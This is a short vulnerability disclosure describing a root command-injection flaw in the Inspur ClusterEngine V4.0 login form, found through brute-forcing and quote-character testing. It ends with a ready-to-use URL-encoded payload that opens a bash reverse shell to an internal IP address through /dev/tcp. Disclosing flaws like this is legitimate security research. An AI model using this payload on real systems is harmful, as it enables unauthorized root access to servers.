# Inspur ClusterEngineV4.0 Remote Code Execute

# 0x01 Description

Today, i found a`Inspur Server Cluster Management System` in our intranet, which login page looks like that.

![1573267238057](img/1573267238057.png)

It doesn't have verification code, so i decide to crack a login account.

![1573267410033](img/1573267410033.png)



when burpsuite crack down, i noticed if post data has `;'`, the response packet is abnormal.

![1573267472820](img/1573267472820.png)

At now, I realize that there may be a remote code execution, and I put this packet in repeater to repeat it, I found if there is a `'` in post data, the system will throw an exception.

![1573267667895](img/1573267667895.png)

![1573267621779](img/1573267621779.png)

When I further tested, I found that either the username parameter or the password parameter contains `'`, an exception will be thrown.

![1573267874260](img/1573267874260.png)

So I decided to try send `' '`  to see the response packet.

![1573267904173](img/1573267904173.png)

I noticed `grep` command error,  may be server code like 
```shell
var1 = `grep xxxx`
var2 = $(python -c "from crypt import crypt;print crypt('$passwd','$1$$var1')")
```

So i try to send `-V` and `--help` to see response packet,  the response packet confirmed my guess.

![1573268170355](img/1573268170355.png)

![1573268245311](img/1573268245311.png)

Try to read `/etc/passwd`

![1573268332873](img/1573268332873.png)

Try to list the directories

![1573268361127](img/1573268361127.png)



# 0x02 Pwned

Now, I confirmed there is a remote code execution that a found, after fuzz, I got the following payload

`whoami`

![1573268530852](img/1573268530852.png)

`uname`

![1573268555327](img/1573268555327.png)

`revershell`

```
op=login&username=1 2\',\'1\'\);  `bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.16.11.81%2F80%200%3E%261`
```

When i send payload, i get a `root shell` in my `kali linux`server

![1573268596272](img/1573268596272.png)

![1573267093372](img/1573267093372.png)